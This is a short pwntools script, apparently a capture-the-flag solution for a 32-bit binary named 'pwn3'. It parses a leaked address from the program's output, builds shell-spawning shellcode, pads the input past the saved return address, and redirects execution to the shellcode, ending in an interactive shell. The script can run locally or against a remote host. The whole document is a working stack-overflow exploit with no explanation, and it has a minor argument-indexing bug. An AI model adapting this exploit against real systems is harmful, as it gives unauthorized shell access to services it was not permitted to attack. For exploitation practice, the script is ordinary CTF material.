from pwn import *
import re

context(os="linux", arch="i386")
context.log_level = "debug"

HOST = "target"
PORT = 8080
conn = None

if len(sys.argv) > 1 and sys.argv[2] == "r":
    conn = remote(HOST, PORT)
else:
    conn = process("./pwn3")

recv=conn.recvline()

pattern=b"0x[a-z0-9]*"
match=re.search(pattern,recv)
addr=str(match.group())[2:-1]
payload=asm(shellcraft.sh())
payload+=(b"A"*(0x12A+0x4-len(payload)))
payload+=p32(int(addr,16))
conn.sendline(payload)
conn.interactive()
